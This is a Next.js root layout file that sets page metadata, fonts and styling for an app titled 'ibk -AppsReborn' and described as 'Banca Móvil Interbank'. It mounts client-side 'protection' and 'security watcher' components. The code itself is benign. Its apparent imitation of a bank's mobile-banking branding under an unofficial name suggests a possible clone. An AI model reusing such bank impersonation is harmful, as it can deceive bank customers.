import type { Metadata, Viewport } from "next";
import "./globals.css";
import ClientProtections from "@/components/ClientProtections";
import SeguridadWatcher from "@/components/SeguridadWatcher";

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  viewportFit: "cover",
  themeColor: "#00B14F",
};

export const metadata: Metadata = {
  title: {
    default: "ibk -AppsReborn",
    template: "%s",
  },
  description: "Banca Móvil Interbank",
  manifest: "/manifest.json",
  icons: {
    icon: "/img/favicon.png",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="es">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link
          href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700;800;900&display=swap"
          rel="stylesheet"
        />
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
        />
      </head>
      <body className="font-sans antialiased bg-[#00B14F] text-[#333333] selection:bg-transparent overflow-x-hidden min-h-screen">
        <ClientProtections />
        <SeguridadWatcher />
        <div className="mx-auto max-w-[480px] min-h-screen bg-[#00B14F] relative shadow-2xl flex flex-col">
          {children}
        </div>
      </body>
    </html>
  );
}
